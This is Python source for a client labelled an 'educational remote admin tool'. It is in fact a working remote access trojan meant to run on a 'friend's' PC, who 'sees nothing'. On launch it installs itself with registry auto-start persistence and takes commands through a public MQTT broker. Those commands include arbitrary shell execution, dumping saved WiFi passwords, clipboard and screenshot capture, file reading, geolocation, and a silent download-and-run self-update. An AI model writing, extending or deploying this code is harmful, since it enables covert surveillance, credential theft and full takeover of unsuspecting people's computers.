"""
EDUCATIONAL REMOTE ADMIN TOOL - CLIENT (relay version)
=====================================================
Works from ANYWHERE (behind hotspots, CGNAT, different countries)
by connecting OUT to a free public MQTT relay - the same way
TeamViewer/AnyDesk work. No port forwarding. No installs.

The friend only ever sees ONE file: EduRemoteAdmin.exe

TO REMOVE: EduRemoteAdmin.exe --uninstall
"""

import os
import sys
import shutil
import socket
import subprocess
import platform
import time
import json
import uuid

# paho-mqtt ships inside the exe - nothing to install on his side
try:
    import paho.mqtt.client as mqtt
except ImportError:
    os._exit(1)

# ============================================================
# SETTINGS
# ============================================================
# Free public relay - no account needed
MQTT_HOST = "broker.emqx.io"
MQTT_PORT = 1883
# Secret channel name so nobody else can read our traffic
CHANNEL = "edu-ra-a7f3k9q2"

TOPIC_CMDS = f"{CHANNEL}/cmds"
TOPIC_RESPONSES = f"{CHANNEL}/responses"

INSTALL_DIR = os.path.join(os.path.expanduser("~"), "edu-remote-admin")
INSTALLED_FILE = os.path.join(INSTALL_DIR, "EduRemoteAdmin.exe")
REG_RUN_KEY = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
REG_RUN_NAME = "EduRemoteAdmin"

HELP_TEXT = """
==================== COMMANDS ====================
sysinfo              - OS, user, hostname, public IP
pwd                  - current directory
ls [path]            - list directory contents
cat <file>           - read a text file
download <file>      - copy a file to downloads folder
ps                   - list running processes
geo                  - approximate location (city/region from IP)
kill <name|pid>      - close a process (e.g. kill chrome.exe)
screenshot           - take screenshot on remote PC
clip                 - get clipboard text (read-only)
msg <text>           - show a message box on remote PC
open <path>          - open a file/URL on remote PC
wallpaper <path>     - change desktop wallpaper
wifi                 - list saved WiFi networks + passwords
disk                - show all drive sizes and free space
battery              - battery status
uptime               - how long the PC has been on
lock                 - lock the remote PC's screen
update <url>         - download + install a new version silently

Any other command runs as a Windows shell command.
Examples: whoami, systeminfo, tasklist, dir C:\\, echo hi
====================================================
"""


# ============================================================
# COMMANDS (same as before)
# ============================================================
def get_sysinfo():
    import getpass
    pub_ip = "(offline)"
    try:
        import urllib.request
        pub_ip = urllib.request.urlopen(
            "https://api.ipify.org", timeout=5
        ).read().decode()
    except Exception:
        pass
    return (
        f"OS:        {platform.system()} {platform.release()}\n"
        f"Hostname:  {platform.node()}\n"
        f"User:      {getpass.getuser()}\n"
        f"Arch:      {platform.machine()}\n"
        f"Public IP: {pub_ip}\n"
        f"Time:      {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )


def list_processes():
    output = subprocess.run(
        "tasklist", shell=True, capture_output=True, text=True
    )
    return output.stdout[:3000] or "(no output)"


def take_screenshot():
    path = os.path.join(INSTALL_DIR, "screenshots")
    os.makedirs(path, exist_ok=True)
    fpath = os.path.join(path, f"screenshot_{int(time.time())}.png")
    ps = (
        "Add-Type -AssemblyName System.Windows.Forms;"
        "Add-Type -AssemblyName System.Drawing;"
        "$b = New-Object System.Drawing.Bitmap("
        "[System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width,"
        "[System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height);"
        "$g = [System.Drawing.Graphics]::FromImage($b);"
        "$g.CopyFromScreen(0,0,0,0,$b.GetSize());"
        f"$b.Save('{fpath}');"
        "$g.Dispose();$b.Dispose()"
    )
    try:
        subprocess.run(
            ["powershell", "-Command", ps],
            capture_output=True, timeout=10
        )
        return f"Screenshot saved: {fpath}"
    except Exception as e:
        return f"Error: {e}"


def get_clipboard():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.withdraw()
        text = root.clipboard_get()
        root.destroy()
        return text or "(clipboard empty)"
    except Exception as e:
        return f"(clipboard error: {e})"


def get_battery():
    output = subprocess.run(
        'powershell -Command "(Get-CimInstance Win32_Battery).EstimatedChargeRemaining"',
        shell=True, capture_output=True, text=True
    )
    return f"Battery: {output.stdout.strip() or 'unknown'}"


def get_uptime():
    output = subprocess.run(
        'powershell -Command "((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).ToString()"',
        shell=True, capture_output=True, text=True
    )
    return output.stdout.strip() or "unknown"


def show_message(text):
    def _show():
        import tkinter as tk
        from tkinter import messagebox
        root = tk.Tk()
        root.withdraw()
        root.after(1, lambda: (messagebox.showinfo("Message", text), root.destroy()))
        root.mainloop()

    import threading
    threading.Thread(target=_show, daemon=True).start()
    return "(message shown)"


def download_file(path):
    if not os.path.exists(path):
        return f"Error: {path} not found"
    dl_dir = os.path.join(INSTALL_DIR, "downloads")
    os.makedirs(dl_dir, exist_ok=True)
    try:
        dest = os.path.join(dl_dir, os.path.basename(path))
        shutil.copy2(path, dest)
        return f"Downloaded to {dest}"
    except Exception as e:
        return f"Error: {e}"


def lock_screen():
    subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
    return "Screen locked."


def get_wifi_passwords():
    """Show all saved WiFi names and their passwords."""
    output = subprocess.run(
        "netsh wlan show profiles", shell=True, capture_output=True, text=True
    )
    import re
    profiles = re.findall(r"All User Profile\s*:\s*(.*)", output.stdout)
    result = []
    for profile in profiles:
        name = profile.strip()
        pwd_output = subprocess.run(
            f'netsh wlan show profile name="{name}" key=clear',
            shell=True, capture_output=True, text=True
        )
        pwd_match = re.search(
            r"Key Content\s*:\s*(.*)", pwd_output.stdout
        )
        password = pwd_match.group(1).strip() if pwd_match else "(none)"
        result.append(f"{name}  :  {password}")
    return "\n".join(result) if result else "(no saved wifi networks found)"


def get_geolocation():
    """Approximate location from public IP (city/region level)."""
    import urllib.request
    try:
        resp = urllib.request.urlopen(
            "https://ipinfo.io/json", timeout=5
        ).read().decode()
        data = json.loads(resp)
        return (
            f"IP:      {data.get('ip', '?')}\n"
            f"City:    {data.get('city', '?')}\n"
            f"Region:  {data.get('region', '?')}\n"
            f"Country: {data.get('country', '?')}\n"
            f"Coords:  {data.get('loc', '?')}\n"
            f"Org:     {data.get('org', '?')}"
        )
    except Exception as e:
        return f"(geolocation error: {e})"


def get_disks():
    """Show disk usage."""
    import string
    result = []
    for letter in string.ascii_uppercase:
        path = f"{letter}:\\"
        if os.path.exists(path):
            try:
                import shutil as s
                total, _, free = s.disk_usage(path)
                used = total - free
                result.append(
                    f"{letter}:  {used // (1024**3)}GB used / "
                    f"{total // (1024**3)}GB total "
                    f"({free // (1024**3)}GB free)"
                )
            except Exception:
                pass
    return "\n".join(result) if result else "(no drives found)"


def change_wallpaper(path):
    if not os.path.exists(path):
        return f"Error: {path} not found"
    import ctypes
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    return "Wallpaper changed."


def do_self_update(exe_url):
    """Download a new version, swap it in, restart. Friend sees nothing."""
    import urllib.request
    new_exe = os.path.join(INSTALL_DIR, "EduRemoteAdmin_new.exe")
    urllib.request.urlretrieve(exe_url, new_exe)

    # Hidden batch script: waits for us to exit, swaps files,
    # restarts the new version, deletes itself. No window shown.
    bat = os.path.join(INSTALL_DIR, "update.bat")
    with open(bat, "w") as f:
        f.write(
            '@echo off\n'
            'timeout /t 2 /nobreak >nul\n'
            f'move /y "{new_exe}" "{INSTALLED_FILE}"\n'
            f'start "" "{INSTALLED_FILE}"\n'
            'del "%~f0"\n'
        )
    subprocess.Popen(
        ["cmd", "/c", bat], creationflags=0x08000000  # CREATE_NO_WINDOW
    )
    os._exit(0)  # let the batch take over


def run_command(cmd):
    try:
        if cmd == "help":
            return HELP_TEXT
        elif cmd == "sysinfo":
            return get_sysinfo()
        elif cmd == "pwd":
            return os.getcwd()
        elif cmd == "ps":
            return list_processes()
        elif cmd == "screenshot":
            return take_screenshot()
        elif cmd == "clip":
            return get_clipboard()
        elif cmd == "battery":
            return get_battery()
        elif cmd == "uptime":
            return get_uptime()
        elif cmd == "lock":
            return lock_screen()
        elif cmd == "wifi":
            return get_wifi_passwords()
        elif cmd == "disk":
            return get_disks()
        elif cmd == "ipconfig":
            output = subprocess.run(
                "ipconfig", shell=True, capture_output=True, text=True
            )
            return output.stdout
        elif cmd == "geo":
            return get_geolocation()
        elif cmd.startswith("kill "):
            # kill <name or pid> — e.g. "kill chrome.exe" or "kill 1234"
            target = cmd.split(" ", 1)[1].strip()
            if target.isdigit():
                r = subprocess.run(
                    ["taskkill", "/PID", target, "/F"],
                    capture_output=True, text=True
                )
            else:
                r = subprocess.run(
                    ["taskkill", "/IM", target, "/F"],
                    capture_output=True, text=True
                )
            if r.returncode == 0:
                return f"Killed {target}"
            return f"Error: {r.stderr or r.stdout or 'failed'}"
        elif cmd.startswith("ls"):
            path = cmd.split(" ", 1)[1] if " " in cmd else "."
            try:
                items = os.listdir(path)
                return "\n".join(items) if items else "(empty)"
            except Exception as e:
                return f"Error: {e}"
        elif cmd.startswith("cat "):
            try:
                with open(cmd.split(" ", 1)[1], "r", errors="replace") as f:
                    return f.read()
            except Exception as e:
                return f"Error: {e}"
        elif cmd.startswith("download "):
            return download_file(cmd.split(" ", 1)[1])
        elif cmd.startswith("msg "):
            return show_message(cmd.split(" ", 1)[1])
        elif cmd.startswith("wallpaper "):
            return change_wallpaper(cmd.split(" ", 1)[1])
        elif cmd.startswith("open "):
            path = cmd.split(" ", 1)[1]
            os.startfile(path)
            return f"(opened: {path})"
        elif cmd.startswith("update "):
            url = cmd.split(" ", 1)[1]
            # Wait 3s so this response gets sent before we restart
            import threading
            threading.Timer(3, do_self_update, args=(url,)).start()
            return "Update starting... back online in ~1 minute"
        else:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return (r.stdout or "") + (r.stderr or "") or "(no output)"
    except Exception as e:
        return f"Error: {e}"


# ============================================================
# INSTALL / UNINSTALL
# ============================================================
def _set_registry_run(exe_path):
    subprocess.run(
        ["reg", "add", REG_RUN_KEY,
         "/v", REG_RUN_NAME, "/t", "REG_SZ",
         "/d", f'"{exe_path}"', "/f"],
        capture_output=True
    )


def _remove_registry_run():
    subprocess.run(
        ["reg", "delete", REG_RUN_KEY, "/v", REG_RUN_NAME, "/f"],
        capture_output=True
    )


def install():
    os.makedirs(INSTALL_DIR, exist_ok=True)
    shutil.copy2(os.path.abspath(sys.argv[0]), INSTALLED_FILE)
    _set_registry_run(INSTALLED_FILE)


def uninstall():
    _remove_registry_run()
    if os.path.exists(INSTALL_DIR):
        shutil.rmtree(INSTALL_DIR)


# ============================================================
# CLIENT - connects OUT to relay, works behind any network
# ============================================================
CLIENT_ID = f"edu-ra-client-{uuid.uuid4().hex[:8]}"


def on_connect(client, userdata, flags, rc, properties=None):
    if rc == 0:
        client.subscribe(TOPIC_CMDS)
        client.publish(
            TOPIC_RESPONSES,
            json.dumps({"event": "online", "client": CLIENT_ID})
        )
    else:
        time.sleep(3)


def on_message(client, userdata, msg):
    try:
        data = json.loads(msg.payload.decode())
    except Exception:
        return

    if data.get("client") and data.get("client") != CLIENT_ID:
        return

    cmd = data.get("cmd", "")
    if cmd.lower() in ("exit", "quit"):
        client.disconnect()
        return
    result = run_command(cmd)
    client.publish(
        TOPIC_RESPONSES,
        json.dumps({"client": CLIENT_ID, "cmd": cmd, "result": result})
    )


def run_client():
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=CLIENT_ID,
        protocol=mqtt.MQTTv5
    )
    # Last Will: broker auto-announces us if we drop without saying goodbye
    client.will_set(
        TOPIC_RESPONSES,
        json.dumps({"event": "offline", "client": CLIENT_ID})
    )
    client.on_connect = on_connect
    client.on_message = on_message

    # Heartbeat: tell the console we're alive every 60s
    import threading

    def _heartbeat():
        while True:
            time.sleep(60)
            try:
                client.publish(
                    TOPIC_RESPONSES,
                    json.dumps({"event": "ping", "client": CLIENT_ID})
                )
            except Exception:
                pass

    threading.Thread(target=_heartbeat, daemon=True).start()

    # Persistent connection: keep trying forever with exponential backoff
    # (5s, 10s, 20s, 40s, max 60s) so it survives network drops
    backoff = 5
    while True:
        try:
            client.connect(MQTT_HOST, MQTT_PORT, keepalive=60)
            backoff = 5  # reset after a successful connect
            client.loop_forever()
        except Exception:
            pass
        time.sleep(backoff)
        backoff = min(backoff * 2, 60)
        try:
            client.disconnect()
        except Exception:
            pass
    while True:
        try:
            client.connect(MQTT_HOST, MQTT_PORT, keepalive=60)
            client.loop_forever()
        except Exception:
            pass
        time.sleep(10)
        try:
            client.disconnect()
        except Exception:
            pass


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    if "--uninstall" in sys.argv:
        uninstall()
    else:
        # Double-click = install (copy + registry auto-start)
        # AND start running right away. Works from any location.
        current_exe = os.path.abspath(sys.argv[0])
        if current_exe != INSTALLED_FILE:
            try:
                install()  # copy to install dir + registry auto-start
            except Exception:
                pass
        run_client()
